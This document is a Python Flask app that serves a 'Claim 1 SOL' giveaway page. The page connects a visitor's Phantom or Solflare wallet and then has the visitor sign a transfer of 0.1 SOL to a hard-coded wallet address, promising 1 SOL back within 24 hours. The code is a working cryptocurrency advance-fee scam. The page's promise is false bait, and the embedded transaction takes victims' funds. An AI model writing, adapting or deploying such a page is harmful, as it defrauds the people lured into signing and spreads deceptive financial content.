from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Claim 1 SOL</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding: 40px;
    }
    .qr {
      width: 220px;
      margin: 20px auto;
      display: none;
      border-radius: 16px;
      box-shadow: 0 0 20px #00ff90;
    }
    button {
      background: linear-gradient(90deg, #00ff90, #00d178);
      border: none;
      padding: 14px 30px;
      font-size: 1.2em;
      margin: 15px;
      border-radius: 30px;
      cursor: pointer;
      color: #000;
      font-weight: bold;
    }
  </style>
  <script type="module">
    import {
      Connection,
      PublicKey,
      SystemProgram,
      Transaction
    } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.0/+esm";

    let provider = null;

    function updateStatus(msg) {
      document.getElementById("status").innerText = msg;
    }

    async function detectProvider() {
      if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
        return window.solana;
      }
      return null;
    }

    async function connectWallet() {
      updateStatus("🔍 Detecting wallet...");
      provider = await detectProvider();

      if (!provider) {
        updateStatus("❌ No wallet detected. Please open in Solflare or Phantom app browser.");
        document.getElementById("qr").style.display = "block";
        return;
      }

      try {
        if (provider.isConnected && provider.disconnect) {
          await provider.disconnect();
        }

        const resp = await provider.connect();
        updateStatus("✅ Connected: " + resp.publicKey.toString());
        window.userPublicKey = resp.publicKey;
        document.getElementById("claimBtn").disabled = false;
      } catch (err) {
        console.error(err);
        updateStatus("❌ Connection rejected by user.");
      }
    }

    async function claimSol() {
      if (!provider || !window.userPublicKey) {
        alert("Connect your wallet first.");
        return;
      }

      const connection = new Connection("https://api.mainnet-beta.solana.com");

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: window.userPublicKey,
          toPubkey: new PublicKey("{{ wallet }}"),
          lamports: 0.1 * 1e9
        })
      );

      try {
        const { signature } = await provider.signAndSendTransaction(tx);
        await connection.confirmTransaction(signature);
        alert("✅ 0.1 SOL sent! You will receive 1 SOL within 24 hours.");
      } catch (err) {
        console.error(err);
        alert("❌ Transaction failed: " + err.message);
      }
    }

    window.connectWallet = connectWallet;
    window.claimSol = claimSol;
  </script>
</head>
<body>
  <h1>🎁 Claim Your 1 SOL</h1>
  <p>Send exactly <strong>0.1 SOL</strong> to the address below to claim:</p>
  <code>{{ wallet }}</code>
  <br/>
  <img id="qr" src="{{ qr_url }}" class="qr" alt="QR Code">
  <p id="status">Press "Connect Wallet" to begin</p>
  <button onclick="connectWallet()">Connect Wallet</button>
  <button id="claimBtn" onclick="claimSol()" disabled>Claim Now</button>
  <footer style="margin-top: 40px; font-size: 0.8em; color: #aaa;">&copy; 2025 CoinUpdater</footer>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
